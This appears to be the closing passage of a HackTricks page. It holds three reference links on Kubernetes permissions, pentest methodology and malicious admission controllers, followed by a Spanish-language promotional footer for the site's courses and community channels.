* [**https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions**](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
* [**https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1**](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
* [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
